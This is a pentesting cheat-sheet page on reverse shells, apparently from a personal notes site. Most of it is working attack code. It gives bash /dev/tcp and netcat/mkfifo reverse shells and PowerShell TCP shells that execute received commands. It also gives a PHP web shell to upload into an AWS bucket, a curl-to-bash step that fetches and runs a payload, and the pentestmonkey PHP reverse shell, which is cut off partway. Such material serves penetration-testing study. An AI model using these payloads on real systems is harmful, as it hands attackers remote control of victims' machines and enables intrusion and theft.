---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Reverse Shell

A **Reverse Shell** is a technique used to gain remote access to a victim's system by making the target machine initiate a connection back to the attacker. Unlike a traditional shell, this allows the target to "call back" to the attacker’s machine.&#x20;

Reverse shells are commonly used in penetration testing and hacking scenarios to maintain access, control compromised systems, and perform further exploitation.

Here are some scripts that can be used to create a reverse shell for various scenarios:

## <mark style="color:orange;">Basic script</mark>

* Establish a listener port on the host machine with [_Netcat_](../networks/tools-and-utilities.md#netcat)

{% code overflow="wrap" lineNumbers="true" %}
```bash
nc -nlvp $port     #An arbitrary port 
```
{% endcode %}

***

* Use a script to send the remote shell to the listening port

<pre class="language-sh" data-title="RevShell.sh" data-overflow="wrap" data-line-numbers><code class="lang-sh">#!/bin/bash
<strong>bash -i >&#x26; /dev/tcp/$ip/$port 0>&#x26;1
</strong></code></pre>

{% hint style="info" %}
* `$port` is the port listening with _netcat_ and `$ip` our IP
* If you are using a VPN `$ip` is the IP given to us by the VPN
{% endhint %}

{% hint style="warning" %}
Remember also to give execution permissions to the script
{% endhint %}

***

* It can be also inserted as a command call from a terminal

{% code overflow="wrap" lineNumbers="true" %}
```bash
bash -c "bash -i >& /dev/tcp/$ip/$port 0>&1"
```
{% endcode %}

## <mark style="color:orange;">For Linux hosts</mark>

* Establish a listener port on the host machine with [_Netcat_](../networks/tools-and-utilities.md#netcat)

{% code overflow="wrap" lineNumbers="true" %}
```bash
nc -nvlp $port
```
{% endcode %}

***

* Use a script to send the remote shell to the listening port

{% code title="LinuxRevShell.sh" overflow="wrap" lineNumbers="true" %}
```bash
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $port >/tmp/f
```
{% endcode %}

{% hint style="warning" %}
Remember to give execution permissions to the script
{% endhint %}

***

* Another alternative can be used directly in a command line

{% code overflow="wrap" lineNumbers="true" %}
```bash
/bin/bash -c \'sh -i >& /dev/tcp/10.10.10.10/4444 0>&1\'
```
{% endcode %}

## <mark style="color:orange;">For Powershell on Windows hosts</mark>

* Establish a listener port on the host machine with [_Netcat_](../networks/tools-and-utilities.md#netcat)

{% code overflow="wrap" lineNumbers="true" %}
```bash
nc -nvlp $port
```
{% endcode %}

***

* The command for getting the shell

{% code overflow="wrap" lineNumbers="true" %}
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('$IP',$port);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```
{% endcode %}

***

* An alternative

{% code overflow="wrap" lineNumbers="true" %}
```powershell
$LHOST = "<IP>"; $LPORT = <port>; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
```
{% endcode %}

## <mark style="color:orange;">For awscli</mark>

* Check if we have remote command execution

{% code overflow="wrap" lineNumbers="true" %}
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php #Upload this file in the bucket
http://$url/shell.php?cmd=id #In browser. If there's a response, we have access
```
{% endcode %}

***

* Create a bash file with the payload

{% code title="AwsRevShell.sh" overflow="wrap" lineNumbers="true" %}
```bash
#!/bin/bash 
bash -i >& /dev/tcp/$myip/$portcat 0>&1 #Arbitrary port
```
{% endcode %}

***

* Establish a listener port on the host machine with [_Netcat_](../networks/tools-and-utilities.md#netcat)

{% code overflow="wrap" lineNumbers="true" %}
```bash
nc -nvlp $portcat
```
{% endcode %}

***

* Create a server with _Python_

{% code overflow="wrap" lineNumbers="true" %}
```bash
python3 -m http.server $port #Must be created at the same place where the reverse shell script is
```
{% endcode %}

***

* Use the `curl` command from the local server to get the reverse shell file and pass it to the bash of the machine

{% code overflow="wrap" lineNumbers="true" %}
```bash
http://$url/shell.php?cmd=curl%20$myip:$portpy/$shfile|bash
```
{% endcode %}

## <mark style="color:orange;">For PHP</mark>

* On an upload option from a _PHP_-based page, submit the following script

{% code title="PhpRevShell.php" overflow="wrap" lineNumbers="true" %}
```bash
  <?php
  // php-reverse-shell - A Reverse Shell implementation in PHP
  // Copyright (C) 2007 pentestmonkey@pentestmonkey.net

  set_time_limit (0);
  $VERSION = "1.0";
  $ip = '$IP';  // You have changed this
  $port = $port;  // And this
  $chunk_size = 1400;
  $write_a = null;
  $error_a = null;
  $shell = 'uname -a; w; id; /bin/sh -i';
  $daemon = 0;
  $debug = 0;

  //
  // Daemonise ourself if possible to avoid zombies later
  //

  // pcntl_fork is hardly ever available, but will allow us to daemonise
  // our php process and avoid zombies.  Worth a try...
  if (function_exists('pcntl_fork')) {
    // Fork and have the parent process exit
    $pid = pcntl_fork();
    
    if ($pid == -1) {
      printit("ERROR: Can't fork");
      exit(1);
    }
    
    if ($pid) {
      exit(0);  // Parent exits
    }

    // Make the current process a session leader
    // Will only succeed if we forked
    if (posix_setsid() == -1) {
      printit("Error: Can't setsid()");
      exit(1);
    }

    $daemon = 1;
  } else {
    printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
  }

  // Change to a safe directory
  chdir("/");

  // Remove any umask we inherited
  umask(0);

  //
    // Do the reverse shell...
  //

  // Open reverse connection
  $sock = fsockopen($ip, $port, $errno, $errstr, 30);
  if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
  }

  // Spawn shell process
  $descriptorspec = array(
    0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
    1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
    2 => array("pipe", "w")   // stderr is a pipe that the child will write to
  );

  $process = proc_open($shell, $descriptorspec, $pipes);

  if (!is_resource($process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
  }

  // Set everything to non-blocking
  
```
{% endcode %}

***

* Establish a listener port on the host machine with [_Netcat_](../networks/tools-and-utilities.md#netcat)

{% code overflow="wrap" lineNumbers="true" %}
```bash
nc -nvlp $portcat
```
{% endcode %}

***

* Call the file from the browser and check if the shell was caught by the _Netcat_ listener

{% code overflow="wrap" lineNumbers="true" %}
```bash
http://$url/PhpRevShell.php            
http://$url/uploads/PhpRevShell.php    #Common route for PHP
http://$url/_uploaded/PhpRevShell.php  #Another common route
```
{% endcode %}
